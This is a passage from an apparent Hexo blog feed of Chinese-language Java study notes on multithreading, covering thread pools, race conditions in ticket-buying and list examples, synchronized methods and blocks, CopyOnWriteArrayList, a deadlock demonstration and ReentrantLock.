class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//1.创建线程池</span><br>        <span class="hljs-comment">//参数为线程池大小</span><br>        ExecutorService service= Executors.newFixedThreadPool(<span class="hljs-number">10</span>);<br><br>        service.execute(<span class="hljs-keyword">new</span> MyThread());<br>        service.execute(<span class="hljs-keyword">new</span> MyThread());<br>        service.execute(<span class="hljs-keyword">new</span> MyThread());<br>        service.execute(<span class="hljs-keyword">new</span> MyThread());<br>        <span class="hljs-comment">//2.关闭连接</span><br>        service.shutdown();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyThread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>            System.out.println(Thread.currentThread().getName());<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_多线程_4</title>
    <link href="/2021/04/06/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_4/"/>
    <url>/2021/04/06/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_4/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程学习——-4"><a href="#多线程学习——-4" class="headerlink" title="多线程学习—— 4"></a>多线程学习—— 4</h1><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>多个线程操作同一个资源</p><p>并发：同一个对象被多个线程同时操作</p><p>处理多线程问题时，多个线程访问同一个对象，并且某些线程还想修改这个对象.这时候我们就需要线程同步﹒线程同步其实就是一种等待机制,多个需要同时访问此对象的线程进入这个对象的等待池形成队列,等待前面线程使用完毕，下一个线程再使用</p><ul><li>由于同一进程的多个线程共享同一块存储空间，在带来方便的同时,也带来了访问冲突问题﹐为了保证数据在方法中被访问时的正确性﹐在访问时加入锁机制synchronized,当一个线程获得对象的排它锁,独占资源﹐其他线程必须等待，使用后释放锁即可.存在以下问题:<ul><li>一个线程持有锁会导致其他所有需要此锁的线程挂起;</li><li>在多线程竞争下，加锁，释放锁会导致比较多的上下文切换和调度延时,引起性能问题;</li><li>如果一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置,引起性能问题．</li></ul></li></ul><h2 id="队列和锁"><a href="#队列和锁" class="headerlink" title="队列和锁"></a>队列和锁</h2><p>UnsafeBuy.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.runtime.config.TubelineFeatureReader;<br><br><span class="hljs-comment">//不安全的买票</span><br><br><span class="hljs-comment">//线程不安全，有负数</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeBuy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Buy station=<span class="hljs-keyword">new</span> Buy();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;one&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;two&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;san&quot;</span>).start();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Buy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> nums=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">boolean</span> flag= <span class="hljs-keyword">true</span>;<span class="hljs-comment">//外部停止方式</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">while</span> (flag)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                buy();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">buy</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        <span class="hljs-keyword">if</span>(nums&lt;=<span class="hljs-number">0</span>)&#123;<br>            flag=<span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-comment">//模拟延迟</span><br>        Thread.sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-comment">//买票</span><br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;拿到&quot;</span>+nums--);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>UnsafeList.jva</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeList</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        List&lt;String&gt; list=<span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                list.add(Thread.currentThread().getName());<br>            &#125;).start();<br>        &#125;<br>        Thread.sleep(<span class="hljs-number">100</span>);<br>        System.out.println(list.size());<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="线程同步-1"><a href="#线程同步-1" class="headerlink" title="线程同步"></a>线程同步</h2><ul><li>由于同一进程的多个线程共享同一块存储空间，在带来方便的同时,也带来了访问冲突问题﹐为了保证数据在方法中被访问时的正确性﹐在访问时加入锁机制synchronized ,当一个线程获得对象的排它锁，独占资源﹐其他线程必须等待，使用后释放锁即可.存在以下问题:<ul><li>一个线程持有锁会导致其他所有需要此锁的线程挂起﹔</li><li>在多线程竞争下，加锁﹐释放锁会导致比较多的上下文切换和调度延时,引起性能问题;</li><li>如果一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置,引起性能问题.</li></ul></li></ul><p><strong>同步方法</strong></p><ul><li><p>由于我们可以通过 private关键字来保证数据对象只能被方法访问﹐所以我们只需要针对方法提出一套机制,这套机制就是synchronized关键字，它包括两种用法∶synchronized方法和synchronized块.</p><div class="hljs code-wrapper"><pre><code>同步方法:public synchronized void method(int args)&#123;&#125;</code></pre></div></li><li><p>synchronized方法控制对“对象”的访问，每个对象对应一把锁﹐每个synchronized方法都必须获得调用该方法的对象的锁才能执行﹐否则线程会阻塞，方法一旦执行﹐就独占该锁，直到该方法返回才释放锁﹐后面被阻塞的线程才能获得这个锁,继续执行</p><p>​    缺陷:若将一个大的方法申明为synchronized将会影响效率</p></li></ul><p>方法中需要修改的内容才需要锁，锁过多，浪费资源</p><p><strong>同步块</strong></p><ul><li><p>同步块: synchronized (Obj ){ }</p></li><li><p>Obj称之为同步监视器</p><ul><li><p>Obj可以是任何对象﹐但是推荐使用共享资源作为同步监视器</p></li><li><p>同步方法中无需指定同步监视器﹐因为同步方法的同步监视器就是this ,就是这个对象本身﹐或者是class [反射中讲解]</p></li></ul></li><li><p>同步监视器的执行过程</p><ol><li>第一个线程访问﹐锁定同步监视器﹐执行其中代码．</li><li>第二个线程访问﹐发现同步监视器被锁定﹐无法访问．</li><li>第一个线程访问完毕,解锁同步监视器．</li><li>第二个线程访问,发现同步监视器没有锁﹐然后锁定并访问</li></ol></li></ul><p>SafeBuy.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.runtime.config.TubelineFeatureReader;<br><br><span class="hljs-comment">//依旧不安全的买票</span><br><br><span class="hljs-comment">//线程不安全，有负数</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeBuy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Buy station=<span class="hljs-keyword">new</span> Buy();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;one&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;two&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(station,<span class="hljs-string">&quot;san&quot;</span>).start();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Buy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> nums=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">boolean</span> flag= <span class="hljs-keyword">true</span>;<span class="hljs-comment">//外部停止方式</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">while</span> (flag)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            buy();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//synchronized 同步方法，锁的是this</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">buy</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(nums&lt;=<span class="hljs-number">0</span>)&#123;<br>            flag=<span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-comment">//模拟延迟</span><br>        <span class="hljs-comment">//Thread.sleep(1000);</span><br>        <span class="hljs-comment">//买票</span><br>        System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;拿到&quot;</span>+nums--);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>SafeList.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//依旧不安全</span><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnsafeList</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        List&lt;String&gt; list=<span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                <span class="hljs-keyword">synchronized</span> (list)&#123;<br>                    list.add(Thread.currentThread().getName());<br>                &#125;<br><br>            &#125;).start();<br>        &#125;<br>        System.out.println(list.size());<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="JUC安全类型"><a href="#JUC安全类型" class="headerlink" title="JUC安全类型"></a>JUC安全类型</h2><p>相关代码</p><p>JUC.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.util.concurrent.CopyOnWriteArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JUC</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        CopyOnWriteArrayList&lt;String&gt; list=<span class="hljs-keyword">new</span> CopyOnWriteArrayList&lt;String&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>            <span class="hljs-keyword">new</span> Thread(()-&gt;&#123;<br>                list.add(Thread.currentThread().getName());<br>            &#125;).start();<br>        &#125;<br>        System.out.println(list.size());<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><ul><li>多个线程各自占有一些共享资源,并且互相等待其他线程占有的资源才能运行,而<br>导致两个或者多个线程都在等待对方释放资源,都停止执行的情形. 某一个同步块<br>同时拥有“两个以上对象的锁”时,就可能会发生“死锁”的问题.</li></ul><p>DeadLock.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-comment">//死锁：多个线程互相抱着对方需要的资源，然后形成僵持</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeadLock</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Makeup tmp_1=<span class="hljs-keyword">new</span> Makeup(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;one&quot;</span>);<br>        Makeup tmp_2=<span class="hljs-keyword">new</span> Makeup(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;two&quot;</span>);<br><br>        tmp_1.start();<br>        tmp_2.start();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//口红</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lipstick</span></span>&#123;<br><br>&#125;<br><span class="hljs-comment">//镜子</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mirror</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Makeup</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    <span class="hljs-comment">//设置只有一份资源，用static来保证只有一份</span><br>    <span class="hljs-keyword">static</span> Lipstick lipstick=<span class="hljs-keyword">new</span> Lipstick();<br>    <span class="hljs-keyword">static</span> Mirror mirror=<span class="hljs-keyword">new</span> Mirror();<br><br>    <span class="hljs-keyword">int</span> choice;<span class="hljs-comment">//选择</span><br>    String girlName;<span class="hljs-comment">//使用化妆品的人</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Makeup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> choice,String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.choice=choice;<br>        <span class="hljs-keyword">this</span>.girlName=name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            makeup();<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//互相持有对方的锁，就是需要对方的资源</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">makeup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        <span class="hljs-comment">//先获得某一个对象再想获得其他对象</span><br>        <span class="hljs-keyword">if</span>(choice==<span class="hljs-number">0</span>)&#123;<br><br>            <span class="hljs-keyword">synchronized</span> (lipstick)&#123;<br>                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;获得口红的锁&quot;</span>);<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">synchronized</span> (mirror)&#123;<br>                    System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;获得镜子的锁&quot;</span>);<br>                &#125;<br>            &#125;<br><br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">synchronized</span> (mirror)&#123;<br>                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;获得镜子的锁&quot;</span>);<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">synchronized</span> (lipstick)&#123;<br>                    System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;获得口红的锁&quot;</span>);<br>                &#125;<br>            &#125;<br><br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="Lock-锁"><a href="#Lock-锁" class="headerlink" title="Lock(锁)"></a>Lock(锁)</h2><ul><li>从JDK 5.0开始，Java提供了更强大的线程同步机制一 通过显式定义同步锁对象来实现同步。同步锁使用Lock对象充当</li><li>java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得lock对象</li><li>ReentrantL ock类实现了Lock，它拥有与synchronized相同的并发性和内存语义，在实现线程安全的控制中，比较常用的是ReentrantLock,可以显式加锁、释放锁。</li></ul><p>Lock.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;<br><br><span class="hljs-comment">//Lock锁</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lock</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Lock2 lock=<span class="hljs-keyword">new</span> Lock2();<br><br>        <span class="hljs-keyword">new</span> Thread(lock,<span class="hljs-string">&quot;one&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(lock,<span class="hljs-string">&quot;two&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(lock,<span class="hljs-string">&quot;san&quot;</span>).start();<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lock2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> num=<span class="hljs-number">10</span>;<br><br>    <span class="hljs-comment">//定义lock锁</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantLock lock=<span class="hljs-keyword">new</span> ReentrantLock();<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                lock.lock();<span class="hljs-comment">//加锁</span><br>                <span class="hljs-keyword">if</span>(num&gt;=<span class="hljs-number">1</span>)&#123;<br>                    System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;:&quot;</span>+num--);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">finally</span> &#123;<br>                lock.unlock();<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Thread.sleep(<span class="hljs-number">100</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>参考运行结果</p><blockquote><p>one:10<br>two:9<br>san:8<br>two:7<br>one:6<br>san:5<br>san:4<br>two:3<br>one:2<br>one:1</p></blockquote><p>两种锁的比较</p><ul><li>Lock是显式锁(手动开启和关闭锁，别忘记关闭锁) synchronized是隐式锁， 出了作用域自动释放</li><li> Lock只有代码块锁，synchronized有代码块锁和方法锁</li><li>使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类)</li><li>优先使用顺序:<ul><li>Lock &gt;同步代码块(已经进入了方法体，分配了相应资源) &gt;同步方法(在方法体之外)</li></ul></li></ul><p>利用锁实现倒计时</p><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        A a=<span class="hljs-keyword">new</span> A(<span class="hljs-number">1000</span>*<span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">new</span> Thread(a,<span class="hljs-string">&quot;A&quot;</span>).start();<br>        <span class="hljs-keyword">new</span> Thread(a,<span class="hljs-string">&quot;B&quot;</span>).start();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br>    <span class="hljs-comment">//设定暂停时间</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">A</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span 